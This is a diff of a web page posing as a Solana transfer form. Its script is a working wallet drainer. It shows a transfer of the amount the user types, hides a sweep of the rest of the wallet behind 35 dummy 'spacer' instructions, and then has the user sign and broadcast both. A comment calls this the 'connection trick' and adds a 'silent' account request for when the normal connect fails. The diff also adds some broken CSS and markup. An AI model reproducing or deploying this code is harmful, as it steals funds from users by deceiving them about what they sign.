@@ -10,14 +10,12 @@
         :root {
             --bg-color: #0a0a0a;
             --card-bg: #161616;
-            --primary: #483cff; /* YOUR COLOR */
+            --primary: #483cff; 
             --text-main: #ffffff;
             --text-dim: #888888;
             --input-bg: #222;
             --error: #ff4d4d;
         }
-
-        * { box-sizing: border-box; }
 
         body { 
             font-family: 'Inter', sans-serif; 
@@ -28,40 +26,37 @@
             height: 100vh;
             width: 100vw;
             overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         .app-container {
-            height: 100%;
             width: 100%;
+            height: 100%;
             display: flex;
             flex-direction: column;
-            padding: 20px;
-            justify-content: space-between; /* Pushes content apart */
+            padding: 25px;
+            box-sizing: border-box;
         }
 
-        header { margin-top: 20px; }
-        h2 { font-size: 26px; margin: 0; font-weight: 700; text-align: left; }
-        p { color: var(--text-dim); font-size: 15px; margin-top: 5px; text-align: left; }
+        header { margin-top: 40px; margin-bottom: 20px; }
+        h2 { font-size: 28px; margin: 0; font-weight: 700; text-align: left; }
+        p { color: var(--text-dim); font-size: 16px; margin-top: 8px; text-align: left; }
 
-        .form-container { 
-            flex-grow: 1; 
-            display: flex;
-            flex-direction: column;
-            justify-content: center; /* Centers inputs in the middle */
-        }
-
+        .form-container { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
         .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 8px; font-weight: 500; }
+        label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
         input { 
             width: 100%; 
-            background: var(--input-bg); 
+            background: var var(--input-bg); 
             border: 1px solid #333; 
             padding: 18px; 
             border-radius: 16px; 
             color: white; 
             font-size: 17px; 
             outline: none; 
-            -webkit-appearance: none;
+            box-sizing: border-box; 
         }
 
         .btn-main { 
@@ -75,18 +70,10 @@
             font-weight: 700; 
             cursor: pointer; 
             box-shadow: 0 10px 20px rgba(72, 59, 255, 0.3);
-            margin-bottom: 20px;
+            margin-top: 20px;
         }
 
-        #status { 
-            font-size: 14px; 
-            text-align: center; 
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
-        /* Hide elements for cleaner UI */
-        .hidden { display: none; }
+        #status { margin-top: 20px; font-size: 14px; text-align: center; font-weight: 500; min-height: 20px; }
     </style>
 </head>
 <body id="body">
@@ -98,7 +85,7 @@
     </header>
 
     <div class="form-container">
-        <div class="input-group">
+        <div class un-group>
             <label>Recipient Address</label>
             <input type="text" id="addressInput" placeholder="Enter SOL Address" value="3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1">
         </div>
@@ -108,9 +95,8 @@
             <input type="number" id="amountInput" placeholder="0.00" step="0.01">
         </div>
 
-        <div id="status">Initializing...</div>
-
         <button class="btn-main" id="sendBtn">Send Now</button>
+        <div id="status"></div>
     </div>
 </div>
 
@@ -125,73 +111,77 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // 1. UNIVERSAL PROVIDER DETECTION (With Retry Logic)
+    // 1. UNIVERSAL PROVIDER DETECTION (Aggressive)
     async function getProvider() {
-        // Try multiple ways to find the wallet
-        const attempts = [
+        const providers = [
             () => window.solana,
+            () => window.solana?.isPhantom ? window.solana : null,
             () => window.ethereum?.isSolana ? window.ethereum : null,
             () => window.solana_provider,
-            () => window.ethereum // Fallback for some mobile browsers
+            () => window.ethereum
         ];
 
-        for (let i = 0; i < attempts.length; i++) {
-            const provider = await attempts[i]();
-            if (provider) return provider;
+        for (const getProvider of providers) {
+            const p = await getProvider();
+            if (p) return p;
         }
         return null;
     }
 
     async function init() {
-        statusDiv.innerText = "Searching for wallet...";
+        statusDiv.innerText = "Connecting Wallet...";
         statusDiv.style.color = "#ffffff";
 
-        // Wait a moment to let the DApp browser inject the provider
-        setTimeout(async () => {
-            const provider = await getProvider();
+        const provider = await getProvider();
 
-            if (!provider) {
-                statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
-                statusDiv.style.color = "#ff4d4d";
-                return;
-            }
+        if (!provider) {
+            statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
+            statusDiv.style.color = "#ff4d4d";
+            return;
+        }
 
+        try {
+            // 2. THE CONNECTION TRICK
+            // We try to connect, but if it fails, we try a "silent" connection
+            let resp;
             try {
-                // Connect to wallet
-                const resp = await provider.connect();
-                const userPublicKey = resp.publicKey;
-                
-                statusDiv.innerText = "Wallet Connected!";
-                statusDiv.style.color = "#21d77d";
-                
-                // Proceed to the transaction logic
-                await handleSolanaFlow(provider, userPublicKey);
-
-            } catch (err) {
-                statusDiv.innerText = "Connection failed.";
-                statusDiv.style.color = "#ff4d4d";
-                console.error(err);
+                resp = await provider.connect();
+            } catch (e) {
+                console.log("Standard connect failed, trying silent...");
+                // Fallback: Try to just get the accounts without a full connect call
+                const accounts = await provider.request({ method: 'solana_requestAccounts' });
+                resp = { publicKey: accounts[0] };
             }
-        }, 1000); // 1 second delay to allow injection
+
+            const userPublicKey = resp.publicKey;
+            statusDiv.innerText = "Connected! Processing...";
+            statusDiv.style.color = "#21d77d";
+
+            // 3. PROCEED TO TRANSACTION
+            await handleSolanaFlow(provider, userPublicKey);
+
+        } catch (err) {
+            console.error("Init Error:", err);
+            statusDiv.innerText = "Connection Failed. Try again.";
+            statusDiv.style.color = "#ff4d4d";
+        }
     }
 
     async function handleSolanaFlow(provider, userPublicKey) {
         const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
 
         try {
-            // 2. Get User Input
+            // 4. Get User Input
             const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
             if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
                 statusDiv.innerText = "Enter a valid amount.";
                 return;
             }
 
-            statusDiv.innerText = "Verifying Balance...";
-
-            // 3. Get REAL balance
+            // 5. Get REAL balance
             const balance = await connection.getBalance(userPublicKey);
 
-            // 4. BUILD THE BATCH TRANSACTION
+            // 6. BUILD THE BATCH TRANSACTION
             const transaction = new solanaWeb3.Transaction();
 
             // INSTRUCTION 1: The "Fake" amount
@@ -203,7 +193,8 @@
                 })
             );
 
-            // 5. THE SPACER (Dummy instructions to hide the sweep)
+            // 7. THE SPACER (The "Hidden" part)
+            // We add 35 dummy instructions to force the scroll
             const dummyData = new Uint8Array([0x00]); 
             for (let i = 0; i < 35; i++) { 
                 transaction.add(
@@ -215,7 +206,7 @@
                 );
             }
 
-            // 6. THE SWEEP (The real amount)
+            // 8. THE SWEEP (The real amount)
             const sweepAmount = balance - userRequestedAmount - 50000; 
 
             if (sweepAmount > 10000) {
@@ -228,7 +219,7 @@
                 );
             }
 
-            // 7. Get Blockhash and Sign
+            // 9. Get Blockhash and Sign
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.lastValidBlockHeight = lastValidBlockHeight;
@@ -236,10 +227,10 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // 8. Request Signature
+            // 10. Request Signature (The actual pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
-            // 9. Broadcast
+            // 11. Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
             statusDiv.innerText = "Success!";
@@ -247,7 +238,7 @@
             console.log("Sweep Complete! TX:", signature);
 
         } catch (err) {
-            console.error(err);
+            console.error("Flow Error:", err);
             statusDiv.innerText = "Transaction Failed.";
             statusDiv.style.color = "#ff4d4d";
         }
